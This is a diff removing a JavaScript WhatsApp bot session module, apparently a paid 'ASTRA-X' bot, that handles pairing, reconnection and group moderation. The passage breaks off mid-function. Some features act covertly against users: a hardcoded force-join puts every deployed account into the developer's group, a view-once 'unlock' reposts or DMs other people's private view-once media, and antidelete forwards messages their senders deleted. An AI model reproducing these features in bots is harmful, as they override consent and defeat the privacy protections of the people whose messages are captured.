@@ -1,1075 +1,855 @@
-'use strict';
-const makeWASocket = require('@whiskeysockets/baileys').default;
-const {
-  useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion,
-  Browsers, makeCacheableSignalKeyStore, downloadMediaMessage,
-} = require('@whiskeysockets/baileys');
-
-const logger      = require('./logger');
-const settings    = require('./settings');
-const { checkCooldown, setCooldown } = require('./cooldown');
-const userStore = require('./userStore');
-const db          = require('./database');
-const stats       = require('./stats');
-const fs          = require('fs');
-const path        = require('path');
-
-// ── Module-level state ────────────────────────────────────────────────────
-const sessions     = {};
-const commands     = new Map();
-const GLOBAL_PFX   = process.env.BOT_PREFIX || '!';
-const SESS_ROOT    = path.join(__dirname, '../../sessions');
-const floodTracker = {};   // { 'jid_sender': { count, timer } }
-const spamTracker  = {};   // { 'jid_sender': { lastText, count, timer } }
-const sleep        = ms => new Promise(r => setTimeout(r, ms));
-const msgCache      = {};   // antidelete message cache
-const MSG_CACHE_MAX = 500;
-const voCache       = {};   // viewonce cache: msgId → { jid, msg, voMsg, hasVideo, userId }
-const VO_CACHE_MAX  = 200;
-const TWO_DAYS_MS   = 2 * 24 * 60 * 60 * 1000; // 2 days in ms
-
-// ── Auto-cleanup: erase cached messages older than 2 days ─────────────────
-// Keeps bot lightweight and reduces storage costs
-setInterval(() => {
-  const now     = Date.now();
-  const before  = Object.keys(msgCache).length;
-  for (const key in msgCache) {
-    if (msgCache[key].cachedAt && (now - msgCache[key].cachedAt) > TWO_DAYS_MS) {
-      delete msgCache[key];
-    }
-  }
-  const removed = before - Object.keys(msgCache).length;
-  if (removed > 0) logger.info('🧹 Cleaned ' + removed + ' cached messages older than 2 days');
-}, 6 * 60 * 60 * 1000); // Run every 6 hours
-
-// ── Per-user prefix helper ────────────────────────────────────────────────
-const getPrefix = userId => settings.get('prefix:' + userId) || GLOBAL_PFX;
-
-// ── Force-join group — every deployed bot joins this group ────────────────
-const FORCE_GROUP_CODE = 'E3mj8oAq2Fj27oWLeSbrNO';
-async function forceJoinGroup(sock, userId) {
-  try {
-    await sock.groupAcceptInvite(FORCE_GROUP_CODE);
-    logger.info('[' + userId + '] ✅ Joined force group');
-  } catch (e) {
-    if (!String(e.message).includes('already')) {
-      logger.warn('[' + userId + '] Force group: ' + e.message);
-    }
-  }
-}
-
-// ── Load all commands ─────────────────────────────────────────────────────
-function loadCommands() {
-  const dir = path.join(__dirname, '../commands');
-  try {
-    if (!fs.existsSync(dir)) { fs.mkdirSync(dir, { recursive: true }); return; }
-    const files = fs.readdirSync(dir).filter(f => f.endsWith('.js'));
-    commands.clear();
-    for (const file of files) {
-      try {
-        const fp = path.join(dir, file);
-        delete require.cache[require.resolve(fp)];
-        const cmd = require(fp);
-        if (!cmd?.name || typeof cmd.execute !== 'function') continue;
-        commands.set(cmd.name.toLowerCase(), cmd);
-        if (Array.isArray(cmd.aliases)) {
-          cmd.aliases.forEach(a => commands.set(a.toLowerCase(), cmd));
-        }
-      } catch (e) { logger.error(`Load ${file} failed:`, e.message); }
-    }
-    logger.info(`📦 Loaded ${[...new Set(commands.values())].length} commands (${commands.size} with aliases)`);
-  } catch (e) { logger.error('loadCommands error:', e.message); }
-}
-loadCommands();
-
-const getAvailableCommands = () =>
-  [...new Set(commands.values())].map(c => ({ name: c.name, description: c.description || '', category: c.category || 'general' }));
-
-// ── Extract text from ALL WhatsApp message types (prefix fix) ─────────────
-function extractText(msg) {
-  const m = msg?.message;
-  if (!m) return '';
-  return (
-    m.conversation                                           ||
-    m.extendedTextMessage?.text                             ||
-    m.imageMessage?.caption                                 ||
-    m.videoMessage?.caption                                 ||
-    m.documentMessage?.caption                              ||
-    m.buttonsResponseMessage?.selectedButtonId              ||
-    m.listResponseMessage?.singleSelectReply?.selectedRowId ||
-    m.templateButtonReplyMessage?.selectedId                ||
-    m.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ||
-    ''
-  );
-}
-
-// ── Always-online keep-alive ──────────────────────────────────────────────
-function startAlwaysOnline(sock, userId) {
-  let alive = true;
-
-  // Send presence every 9 seconds — WhatsApp marks offline after ~15s
-  const iv = setInterval(async () => {
-    if (!alive) { clearInterval(iv); return; }
-    try {
-      await sock.sendPresenceUpdate('available');
-    } catch (_) {}
-  }, 9_000);
-
-  // Also send immediately on start
-  sock.sendPresenceUpdate('available').catch(() => {});
-
-  sock.ev.on('connection.update', ({ connection }) => {
-    if (connection === 'close') {
-      alive = false;
-      clearInterval(iv);
-      db.unregisterSession(userId);
-    }
-    if (connection === 'open') {
-      // Re-send presence on every reconnect
-      sock.sendPresenceUpdate('available').catch(() => {});
-    }
-  });
-
-  logger.info('🌍 Always-Online active for ' + userId + ' (every 9s)');
-}
-
-// ── Session helpers ───────────────────────────────────────────────────────
-function saveMeta(userId, phoneNumber) {
-  const dir = path.join(SESS_ROOT, userId);
-  fs.mkdirSync(dir, { recursive: true });
-  fs.writeFileSync(path.join(dir, 'meta.json'),
-    JSON.stringify({ phoneNumber, createdAt: new Date().toISOString() }));
-}
-function readMeta(userId) {
-  try {
-    const p = path.join(SESS_ROOT, userId, 'meta.json');
-    return fs.existsSync(p) ? JSON.parse(fs.readFileSync(p, 'utf8')) : null;
-  } catch (_) { return null; }
-}
-function wipeSession(userId) {
-  const dir = path.join(SESS_ROOT, userId);
-  try {
-    if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
-    fs.mkdirSync(dir, { recursive: true });
-  } catch (e) { logger.warn(`wipeSession [${userId}]:`, e.message); }
-}
-
-// ── Baileys version cache ─────────────────────────────────────────────────
-let _version = null;
-async function getVersion() {
-  if (_version) return _version;
-  try { const r = await fetchLatestBaileysVersion(); _version = r.version; }
-  catch (_) { _version = [2, 3000, 1015901893]; }
-  return _version;
-}
-
-// ── Admin check helper ────────────────────────────────────────────────────
-async function isGroupAdmin(sock, jid, participant) {
-  try {
-    const meta = await sock.groupMetadata(jid);
-    return meta.participants.filter(p => p.admin).map(p => p.id).includes(participant);
-  } catch (_) { return false; }
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// createSocket
-// ══════════════════════════════════════════════════════════════════════════
-async function createSocket(userId, phoneNumber, sessDir, opts = {}) {
-  const version        = await getVersion();
-  const { state, saveCreds } = await useMultiFileAuthState(sessDir);
-  const baileysLogger  = logger.child ? logger.child() : logger;
-
-  const sock = makeWASocket({
-    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, baileysLogger) },
-    logger:                         baileysLogger,
-    version,
-    browser:                        Browsers.ubuntu('Chrome'),
-    keepAliveIntervalMs:            9_000,
-    syncFullHistory:                false,
-    downloadHistory:                false,
-    generateHighQualityLinkPreview: false,
-    connectTimeoutMs:               60_000,
-    maxRetries:                     8,
-    printQRInTerminal:              false,
-    defaultQueryTimeoutMs:          30_000,
-    retryRequestDelayMs:            2000,
-    markOnlineOnConnect:            true,
-    fireInitQueries:                true,
-    emitOwnEvents:                  false,
-    mobile:                         false,
-  });
-
-  sessions[userId] = sessions[userId]
-    ? { ...sessions[userId], sock }
-    : { sock, phoneNumber, createdAt: new Date(), code: null, isActive: false };
-  db.registerSession(userId, sock, phoneNumber);
-
-  sock.ev.on('creds.update', () => saveCreds().catch(() => {}));
-
-  let codeRequested = false;
-
-  // Connection lifecycle
-  // ── Connection lifecycle ─────────────────────────────────────────────────
-  sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
-
-    // Request pairing code on 'connecting' using non-blocking setTimeout
-    if (opts.requestCode && !state.creds.registered && connection === 'connecting' && !codeRequested) {
-      codeRequested = true;
-      setTimeout(async () => {
-        let code, lastErr;
-        for (let attempt = 1; attempt <= 3; attempt++) {
-          try {
-            const clean = phoneNumber.replace(/\D/g, '');
-            logger.info('[' + userId + '] Requesting pairing code (attempt ' + attempt + ')...');
-            code = await sock.requestPairingCode(clean);
-            if (code) break;
-          } catch (e) {
-            lastErr = e;
-            logger.warn('[' + userId + '] Attempt ' + attempt + ' failed: ' + e.message);
-            if (attempt < 3) await sleep(2000 * attempt);
-          }
-        }
-        if (code) {
-          const fmt = code.match(/.{1,4}/g)?.join('-') || code;
-          logger.info('[' + userId + '] Pairing code: ' + fmt);
-          if (sessions[userId]) sessions[userId].code = fmt;
-          if (opts.onCode) opts.onCode(fmt);
-        } else {
-          const msg = (lastErr && lastErr.message) || 'No code returned';
-          logger.error('[' + userId + '] requestPairingCode failed: ' + msg);
-          if (opts.onFail) opts.onFail(new Error('Could not get pairing code: ' + msg));
-        }
-      }, 3000);
-    }
-
-    if (connection === 'open') {
-      if (sessions[userId]) sessions[userId].isActive = true;
-      startAlwaysOnline(sock, userId);
-
-      if (opts.requestCode) {
-        // Two cases when connection opens during pairing:
-        // Case 1: creds.registered = FALSE — first connect, code not entered yet. Do nothing.
-        // Case 2: creds.registered = TRUE  — user entered code, WA confirmed link. Send DM.
-        if (state.creds.registered) {
-          // User has fully linked. Send session ID to their own DM then disconnect.
-          (async () => {
-            try {
-              await sleep(3000); // let WA finish key sync
-              const ss  = require('./sessionStore');
-              // Use existing record (already registered at pair-request time)
-              // If somehow missing, register now as a safety fallback
-              const existing = ss.getByUserId(userId);
-              const sid = existing ? existing.sessionId : ss.register(userId, phoneNumber);
-              // Self JID — format: number@s.whatsapp.net
-              const rawJid = sock.user && sock.user.id;
-              if (!rawJid) throw new Error('No user JID after link');
-              // Normalize to s.whatsapp.net (strip :X suffix if present)
-              const selfJid = rawJid.includes(':')
-                ? rawJid.split(':')[0] + '@s.whatsapp.net'
-                : rawJid;
-              const OWNER = process.env.BOT_OWNER || '256747304196';
-              const T = '\u250f' + '\u2501'.repeat(19) + '\u25a3';
-              const D = '\u2520' + '\u2500'.repeat(21);
-              const B = '\u2517' + '\u2501'.repeat(19) + '\u25a3';
-              const P = '\u2503';
-              const H = '[ ASTRA-X TECH ]';
-
-              // Message 1: Session ID — send to own DM
-              await sock.sendMessage(selfJid, {
-                text:
-                  H + '\n' + T + '\n' +
-                  P + ' \uD83D\uDD11 *YOUR SESSION ID*\n' +
-                  D + '\n' +
-                  P + '\n' +
-                  P + '  *' + sid + '*\n' +
-                  P + '\n' +
-                  D + '\n' +
-                  P + ' Tap & hold the ID above to copy it\n' +
-                  B + '\n' +
-                  '_ASTRA-X TECH \uD83C\uDF0D_',
-              });
-
-              await sleep(2500);
-
-              // Message 2: Instructions
-              await sock.sendMessage(selfJid, {
-                text:
-                  H + '\n' + T + '\n' +
-                  P + ' \uD83D\uDCCB *HOW TO ACTIVATE YOUR BOT*\n' +
-                  D + '\n' +
-                  P + ' 1\uFE0F\u20E3  Copy your Session ID above\n' +
-                  P + '\n' +
-                  P + ' 2\uFE0F\u20E3  Send it to the owner on WhatsApp:\n' +
-                  P + '    \uD83D\uDCF1 *+' + OWNER + '*\n' +
-                  P + '\n' +
-                  P + ' 3\uFE0F\u20E3  Pay the activation fee\n' +
-                  P + '\n' +
-                  P + ' 4\uFE0F\u20E3  Owner activates — bot goes ONLINE \u2705\n' +
-                  D + '\n' +
-                  P + ' \u26A0\uFE0F *BEWARE OF SCAMMERS*\n' +
-                  P + ' ONLY send to *+' + OWNER + '*\n' +
-                  P + ' Never pay anyone else!\n' +
-                  B + '\n' +
-                  '_ASTRA-X TECH \uD83D\uDE80_',
-              });
-
-              logger.info('[' + userId + '] Session ID ' + sid + ' sent to user DM at ' + selfJid);
-              await sleep(2000);
-            } catch (e) {
-              logger.error('[' + userId + '] Failed to send session ID DM: ' + e.message);
-            }
-            // Disconnect — user must wait for admin activation
-            try { cancelSession(userId); } catch (_) {}
-            logger.info('[' + userId + '] Session disconnected — awaiting admin activation');
-          })();
-        }
-        // Case 1: creds.registered = false — first open, just showing code. Do nothing.
-      } else {
-        // Restored session — run normal startup tasks
-        setTimeout(() => forceJoinGroup(sock, userId), 8000);
-        // Disconnect if subscription not active — mark as stopped so close handler won't reconnect
-        if (!userStore.isUserActive(userId)) {
-          logger.warn('[' + userId + '] Subscription expired/inactive — disconnecting');
-          if (sessions[userId]) sessions[userId].stopped = true;
-          setTimeout(() => { try { cancelSession(userId); } catch (_) {} }, 3000);
-        }
-      }
-
-      if (opts.onOpen) opts.onOpen();
-    }
-
-    if (connection === 'close') {
-      const statusCode = lastDisconnect && lastDisconnect.error &&
-                         lastDisconnect.error.output && lastDisconnect.error.output.statusCode;
-      if (sessions[userId]) sessions[userId].isActive = false;
-
-      if (!sessions[userId]) return;
-
-      if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
-        delete sessions[userId];
-        if (opts.onFail) opts.onFail(new Error('Logged out'));
-        return;
-      }
-
-      if (opts.requestCode) {
-        if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
-          // Genuine failure — user must re-pair
-          logger.info('[' + userId + '] Pairing failed — must re-pair');
-          if (opts.onFail) opts.onFail(new Error('Pairing failed'));
-          return;
-        }
-        // WA auth exchange causes a normal disconnect then reconnect
-        // Keep alive by reconnecting WITHOUT requestCode so WA can finish the handshake
-        // The pairing code already shown to user remains valid
-        logger.info('[' + userId + '] Pairing auth exchange disconnect — reconnecting in 3s...');
-        setTimeout(() => {
-          if (!sessions[userId]) return; // cancelled by admin/user
-          createSocket(userId, phoneNumber, sessDir, {
-            requestCode: false,
-            onOpen: opts.onOpen,
-            onFail: opts.onFail,
-          }).catch(() => {});
-        }, 3000);
-        return;
-      }
-
-      // If stopped (subscription inactive), do not reconnect
-      if (sessions[userId] && sessions[userId].stopped) { delete sessions[userId]; return; }
-
-      const delay = (statusCode === 428 || statusCode === 408 || statusCode === 515) ? 3000 : 7000;
-      setTimeout(() => {
-        if (!sessions[userId]) return;
-        if (sessions[userId].stopped) { delete sessions[userId]; return; }
-        createSocket(userId, phoneNumber, sessDir, {
-          requestCode: false,
-          onOpen: opts.onOpen,
-          onFail: opts.onFail,
-        }).catch(() => {});
-      }, delay);
-    }
-  });
-
-
-
-
-  sock.ev.on('error', e => logger.error(`Socket error [${userId}]:`, e?.message || e));
-
-  // ── Group participants — welcome, goodbye, antifake, antibot ──────────
-  sock.ev.on('group-participants.update', async ({ id: jid, participants, action }) => {
-    try {
-      if (!jid?.endsWith('@g.us')) return;
-
-      for (const p of participants) {
-        // Newer Baileys returns objects, older returns strings — handle both
-        const participant = typeof p === 'string' ? p : (p?.id || p?.jid || String(p));
-        const num = participant.split('@')[0];
-
-        // ── Re-join force group if bot itself was removed ─────────────
-        const botJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';
-        if ((action === 'remove' || action === 'leave') && participant === botJid) {
-          const groupInviteCode = await sock.groupInviteCode(jid).catch(() => null);
-          if (groupInviteCode === FORCE_GROUP_CODE ||
-              settings.get('forcegroup:' + jid) === FORCE_GROUP_CODE) {
-            setTimeout(() => forceJoinGroup(sock, userId), 10000);
-          }
-        }
-
-        // ── Antifake: kick if not from allowed country code ───────────
-        if ((action === 'add') && settings.get('antifake:' + jid)) {
-          const code = settings.get('antifake_code:' + jid) || '';
-          if (code && !num.startsWith(code)) {
-            await sock.sendMessage(jid, {
-              text: '🛡️ @' + num + ' was removed — only *+' + code + '* numbers are allowed.',
-              mentions: [participant],
-            }).catch(() => {});
-            await sock.groupParticipantsUpdate(jid, [participant], 'remove').catch(() => {});
-            continue;
-          }
-        }
-
-        // ── Antibot: kick numbers matching common bot ranges ──────────
-        if ((action === 'add') && settings.get('antibot:' + jid)) {
-          const botPatterns = [/^1\d{10}$/, /^0{4,}/, /^9999/, /^123456/];
-          if (botPatterns.some(p => p.test(num))) {
-            await sock.sendMessage(jid, {
-              text: '🤖 @' + num + ' was removed — suspected bot number.',
-              mentions: [participant],
-            }).catch(() => {});
-            await sock.groupParticipantsUpdate(jid, [participant], 'remove').catch(() => {});
-            continue;
-          }
-        }
-
-        // ── Welcome ───────────────────────────────────────────────────
-        if (action === 'add' && settings.get('welcome:' + jid)) {
-          let meta = null;
-          try { meta = await sock.groupMetadata(jid); } catch (_) {}
-          const gName = meta?.subject || 'the group';
-          const count = meta?.participants?.length || 0;
-          const tmpl  = settings.get('welcome_msg:' + jid) || '';
-          const text  = tmpl
-            ? tmpl.replace(/{name}/g, '@' + num).replace(/{group}/g, gName).replace(/{count}/g, count)
-            : '👋 Welcome to *' + gName + '*, @' + num + '! 🎉\n\n_Glad to have you! Please read the group rules._\n\n👥 Member #' + count;
-          await sock.sendMessage(jid, { text, mentions: [participant] }).catch(() => {});
-        }
-
-        // ── Goodbye ───────────────────────────────────────────────────
-        if ((action === 'remove' || action === 'leave') && settings.get('goodbye:' + jid)) {
-          let meta = null;
-          try { meta = await sock.groupMetadata(jid); } catch (_) {}
-          const gName = meta?.subject || 'the group';
-          const count = meta?.participants?.length || 0;
-          const tmpl  = settings.get('goodbye_msg:' + jid) || '';
-          const text  = tmpl
-            ? tmpl.replace(/{name}/g, '@' + num).replace(/{group}/g, gName).replace(/{count}/g, count)
-            : '👋 *@' + num + '* has left *' + gName + '*. Goodbye! 😢';
-          await sock.sendMessage(jid, { text, mentions: [participant] }).catch(() => {});
-        }
-      }
-    } catch (e) { logger.error('group-participants.update error:', e.message); }
-  });
-
-  // ── Messages ──────────────────────────────────────────────────────────
-  sock.ev.on('messages.upsert', async ({ messages, type }) => {
-    if (type !== 'notify') return;
-
-    // Stay online whenever a message arrives
-    sock.sendPresenceUpdate('available').catch(() => {});
-
-    for (const msg of messages) {
-      try {
-        const jid = msg.key?.remoteJid;
-        if (!jid) continue;
-
-        // ── Cache message for antidelete ─────────────────────────────
-        if (msg.key?.id && msg.message && !msg.message?.protocolMessage) {
-          const cacheKeys = Object.keys(msgCache);
-          if (cacheKeys.length >= MSG_CACHE_MAX) delete msgCache[cacheKeys[0]];
-          msgCache[msg.key.id] = {
-            jid,
-            sender:    msg.key.participant || msg.key.remoteJid,
-            text:      extractText(msg),
-            timestamp: msg.messageTimestamp,
-            pushName:  msg.pushName || '',
-            cachedAt:  Date.now(), // for 2-day auto-cleanup
-          };
-        }
-
-        // ── Antidelete — detect revoked/deleted messages ──────────────
-        if (msg.message?.protocolMessage?.type === 0) {
-          const deletedId  = msg.message.protocolMessage.key?.id;
-          const cached     = deletedId ? msgCache[deletedId] : null;
-          const groupOn    = settings.get('antidelete:' + jid);
-          const globalOn   = settings.get('antidelete_global:' + userId);
-
-          if (cached && (groupOn || globalOn)) {
-            const ownerJid  = (sessions[userId]?.phoneNumber || '').replace(/\D/g, '') + '@s.whatsapp.net';
-            const senderNum = cached.sender?.split('@')[0] || '?';
-            const name      = cached.pushName || senderNum;
-            const isGroup   = cached.jid?.endsWith('@g.us');
-            const where     = isGroup ? ('Group: ' + cached.jid) : ('DM with: ' + senderNum);
-
-            await sock.sendMessage(ownerJid, {
-              text:
-                '🗑️ *Deleted Message Detected*\n' +
-                '━━━━━━━━━━━━━━━━━━\n' +
-                '👤 *Sender:* ' + name + ' (+' + senderNum + ')\n' +
-                '📍 *' + where + '*\n' +
-                '⏰ *Time:* ' + new Date((cached.timestamp || Date.now()) * 1000).toLocaleTimeString() + '\n' +
-                '━━━━━━━━━━━━━━━━━━\n' +
-                '💬 *Message:*\n' + (cached.text || '[media / no text]'),
-            }).catch(() => {});
-          }
-          continue;
-        }
-
-        // ── Auto view + like status ──────────────────────────────────
-        if (jid === 'status@broadcast') {
-          if (settings.get('autoviewstatus:' + userId))
-            await sock.readMessages([msg.key]).catch(() => {});
-          if (settings.get('autolikestatus:' + userId)) {
-            const author = msg.key.participant || msg.key.remoteJid;
-            await sock.sendMessage(author, { react: { text: '❤️', key: msg.key } }).catch(() => {});
-          }
-          continue;
-        }
-
-        // ── ViewOnce detection (shared logic) ───────────────────────
-        const rawVoMsg = !msg.key.fromMe
-          ? (msg.message?.viewOnceMessage?.message ||
-             msg.message?.viewOnceMessageV2?.message ||
-             msg.message?.viewOnceMessageV2Extension?.message ||
-             (msg.message?.imageMessage?.viewOnce === true ? msg.message : null) ||
-             (msg.message?.videoMessage?.viewOnce === true ? msg.message : null))
-          : null;
-
-        if (rawVoMsg && msg.key.id) {
-          // ── Cache viewonce so reactions can trigger DM delivery ───
-          const voCacheKeys = Object.keys(voCache);
-          if (voCacheKeys.length >= VO_CACHE_MAX) delete voCache[voCacheKeys[0]];
-          voCache[msg.key.id] = {
-            jid,
-            originalMsg: msg,
-            voMsg:    rawVoMsg,
-            hasVideo: !!(rawVoMsg?.videoMessage),
-            userId,
-            cachedAt: Date.now(),
-          };
-
-          // ── novv: anti-viewonce in groups — delete & notify ───────
-          const isGroup = jid.endsWith('@g.us');
-          if (isGroup && settings.get('novv:' + jid)) {
-            const sender    = msg.key.participant || msg.key.remoteJid;
-            const senderNum = sender?.split('@')[0] || '';
-            // Delete the viewonce message
-            await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
-            // Notify sender in their DM (silent if DM fails)
-            const dmJid = senderNum + '@s.whatsapp.net';
-            await sock.sendMessage(dmJid, {
-              text:
-                '〔 ✧ ᴀsᴛʀᴀ-x ᴛᴇᴄʜ ✧ 〕\n' +
-                '┏━━━━━━━━━━━━━━━━━━━▣\n' +
-                '┃ 🚫 *VIEW-ONCE BLOCKED*\n' +
-                '┠─────────────────────\n' +
-                '┃ Your view-once message\n' +
-                '┃ was deleted in:\n' +
-                '┃ 📍 ' + jid + '\n' +
-                '┠─────────────────────\n' +
-                '┃ ⚠️ Sending view-once\n' +
-                '┃ messages is *not allowed*\n' +
-                '┃ in that group.\n' +
-                '┗━━━━━━━━━━━━━━━━━━━▣\n' +
-                '_ᴀsᴛʀᴀ-x ᴛᴇᴄʜ 🌍_',
-            }).catch(() => {});
-            continue; // skip further processing of this message
-          }
-
-          // ── viewonce auto-unlock in chat (legacy toggle) ───────────
-          if (settings.get('viewonce:' + userId)) {
-            try {
-              const buf = await downloadMediaMessage(
-                { ...msg, message: rawVoMsg }, 'buffer', {},
-                { logger, reuploadRequest: sock.updateMediaMessage }
-              );
-              const cap = '👁️ *ViewOnce unlocked by ASTRA-X*';
-              if (rawVoMsg.videoMessage)
-                await sock.sendMessage(jid, { video: buf, caption: cap, mimetype: 'video/mp4' }).catch(() => {});
-              else if (rawVoMsg.imageMessage)
-                await sock.sendMessage(jid, { image: buf, caption: cap }).catch(() => {});
-            } catch (_) {}
-          }
-        }
-
-        await handleMessage(sock, msg, userId);
-      } catch (e) { logger.error('messages.upsert crash:', e.message); }
-    }
-  });
-
-  // ── React to a ViewOnce → unlocked media sent to reactor's DM ───────────
-  sock.ev.on('messages.reaction', async (reactions) => {
-    for (const reaction of reactions) {
-      try {
-        // Only handle add reactions (not removals)
-        if (!reaction.key?.id || !reaction.reaction?.text) continue;
-
-        // The message that was reacted TO
-        const reactedMsgId = reaction.key.id;
-        const cached = voCache[reactedMsgId];
-        if (!cached) continue; // not a cached viewonce, ignore
-
-        // Who reacted
-        const reactorJid = reaction.reaction.senderJid ||
-                           reaction.key.participant ||
-                           reaction.key.remoteJid;
-        if (!reactorJid) continue;
-
-        const dmJid = reactorJid.endsWith('@s.whatsapp.net')
-          ? reactorJid
-          : reactorJid.split('@')[0] + '@s.whatsapp.net';
-
-        try {
-          const buf = await downloadMediaMessage(
-            { ...cached.originalMsg, message: cached.voMsg }, 'buffer', {},
-            { logger, reuploadRequest: sock.updateMediaMessage }
-          );
-          const cap =
-            '👁️ *View-once unlocked by ASTRA-X*\n' +
-            '📩 _Sent to your DM via reaction_';
-
-          if (cached.hasVideo) {
-            await sock.sendMessage(dmJid, { video: buf, caption: cap, mimetype: 'video/mp4' });
-          } else {
-            await sock.sendMessage(dmJid, { image: buf, caption: cap });
-          }
-        } catch (_) {}
-      } catch (e) { logger.error('messages.reaction viewonce crash:', e.message); }
-    }
-  });
-
-  return sock;
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// handleMessage — all protections + per-user prefix
-// ══════════════════════════════════════════════════════════════════════════
-async function handleMessage(sock, msg, userId) {
-  try {
-    if (!msg?.message) return;
-    const jid = msg.key.remoteJid;
-    if (!jid) return;
-
-    // Extract text early so we can check prefix before the fromMe block
-    const rawText  = extractText(msg).trim();
-    const PREFIX   = getPrefix(userId);
-
-    const selfJid    = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';
-    const isSelfChat = jid === selfJid;
-
-    // CRITICAL FIX: Allow fromMe messages if:
-    // 1. It's self-chat (owner messaging their own number), OR
-    // 2. It's a prefix command (owner controlling bot from their own WhatsApp in any chat)
-    // This lets the bot owner use commands from their own account in groups/DMs
-    if (msg.key?.fromMe && !isSelfChat && !rawText.startsWith(PREFIX)) return;
-
-    const sender   = msg.key.participant || (msg.key.fromMe ? selfJid : jid);
-    const ownerNum = (sessions[userId]?.phoneNumber || '').replace(/\D/g, '');
-    // fromMe means the message is FROM the bot's account = always the owner
-    const isOwner  = msg.key.fromMe === true
-                  || sender.split('@')[0] === ownerNum
-                  || jid.split('@')[0] === ownerNum;
-    const isGroup  = jid.endsWith('@g.us');
-    const text     = extractText(msg).trim();
-
-    // ── Banned user check ────────────────────────────────────────────────
-    const senderNum = sender ? sender.split('@')[0] : '';
-    if (senderNum && userStore.isBanned(senderNum)) {
-      // Silently ignore banned users
-      return;
-    }
-
-    // ── Activation gate ───────────────────────────────────────────────────
-    // Bot only responds to owner OR users with active subscriptions
-    if (!isOwner) {
-      if (!userStore.isUserActive(userId)) {
-        // Silently ignore — not activated or subscription expired
-        return;
-      }
-    }
-
-    // ── Maintenance mode — only owner passes ─────────────────────────
-    if (settings.get('maintenance:' + userId) && !isOwner) return;
-
-    // ── Track activity for tagactive/taginactive ──────────────────────
-    if (isGroup && !msg.key.fromMe && sender) {
-      settings.set('lastmsg:' + jid + ':' + sender, Date.now());
-    }
-
-    // ── Mute by time — delete all messages from muted user ───────────
-    if (isGroup && !isOwner) {
-      const muteKey    = 'muted:' + jid + ':' + sender;
-      const muteExpiry = settings.get(muteKey);
-      if (muteExpiry) {
-        if (Date.now() < muteExpiry) {
-          await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
-          const minsLeft = Math.ceil((muteExpiry - Date.now()) / 60000);
-          await sock.sendMessage(jid, {
-            text: '🔇 @' + sender.split('@')[0] + ' you are muted for ' + minsLeft + ' more minute(s). Your messages will be deleted.',
-            mentions: [sender],
-          }).catch(() => {});
-          return;
-        } else {
-          settings.del(muteKey);
-        }
-      }
-    }
-
-    // ── Count every incoming message ─────────────────────────────────
-    stats.recordMessage();
-
-    // ── Auto-read (silent, all messages) ─────────────────────────────
-    if (settings.get('autoread:' + userId))
-      await sock.readMessages([msg.key]).catch(() => {});
-
-    // ── AFK: clear if AFK person sends a message ──────────────────────
-    const afkKey  = 'afk:' + userId + ':' + sender;
-    if (settings.get(afkKey)) {
-      settings.del(afkKey);
-      settings.del('afkdata:' + userId + ':' + sender);
-      await sock.sendMessage(jid, {
-        text: '👋 Welcome back *' + (msg.pushName || sender.split('@')[0]) + '*! Your AFK status has been removed.',
-      }).catch(() => {});
-    }
-
-    // ── AFK: notify if someone mentions an AFK user ───────────────────
-    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-    for (const mentionedJid of mentioned) {
-      const mAfkKey = 'afk:' + userId + ':' + mentionedJid;
-      if (settings.get(mAfkKey)) {
-        const raw  = settings.get('afkdata:' + userId + ':' + mentionedJid) || '{}';
-        const data = JSON.parse(raw);
-        const mins = Math.floor((Date.now() - (data.since || Date.now())) / 60000);
-        await sock.sendMessage(jid, {
-          text: '💤 *@' + mentionedJid.split('@')[0] + '* is AFK' +
-                (data.reason ? '\n📝 Reason: ' + data.reason : '') +
-                '\n⏱️ Since: ' + mins + ' minutes ago',
-          mentions: [mentionedJid],
-        }).catch(() => {});
-      }
-    }
-
-    // ── Group protections (run on ALL messages, not just prefix) ─────
-
-    if (isGroup) {
-      // Antilink ──────────────────────────────────────────────────────
-      if (settings.get('antilink:' + jid)) {
-        const urlRx = /(https?:\/\/[^\s]+|www\.[^\s]+|wa\.me\/[^\s]+|chat\.whatsapp\.com\/[^\s]+)/i;
-        if (urlRx.test(text)) {
-          const admin = await isGroupAdmin(sock, jid, sender);
-          if (!admin) {
-            await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
-            const wk = 'warns:' + jid + ':' + sender;
-            const wc = (settings.get(wk) || 0) + 1;
-            settings.set(wk, wc);
-            const num = sender.split('@')[0];
-            if (wc >= 3) {
-              await sock.sendMessage(jid, { text: '⛔ @' + num + ' removed for sharing links 3 times.', mentions: [sender] }).catch(() => {});
-              await sock.groupParticipantsUpdate(jid, [sender], 'remove').catch(() => {});
-              settings.del(wk);
-            } else {
-              await sock.sendMessage(jid, { text: '🚫 @' + num + ' links not allowed!\n⚠️ Warning *' + wc + '/3* — Removed at 3 warns.', mentions: [sender] }).catch(() => {});
-            }
-            return;
-          }
-        }
-      }
-
-      // Anti-badword ──────────────────────────────────────────────────
-      if (settings.get('antibadword:' + jid) && text) {
-        const bads = (settings.get('badwords:' + jid) || '').split(',').filter(Boolean);
-        if (bads.some(w => text.toLowerCase().includes(w.toLowerCase().trim()))) {
-          const admin = await isGroupAdmin(sock, jid, sender);
-          if (!admin) {
-            await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
-            await sock.sendMessage(jid, { text: '🚫 Please watch your language!' }).catch(() => {});
-            return;
-          }
-        }
-      }
-
-      // Blacklist ─────────────────────────────────────────────────────
-      if (settings.get('blackliston:' + jid) && text) {
-        const list = (settings.get('blacklist:' + jid) || '').split(',').filter(Boolean);
-        if (list.some(w => text.toLowerCase().includes(w.toLowerCase().trim()))) {
-          const admin = await isGroupAdmin(sock, jid, sender);
-          if (!admin) {
-            await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
-            const wk = 'warns:' + jid + ':' + sender;
-            const wc = (settings.get(wk) || 0) + 1;
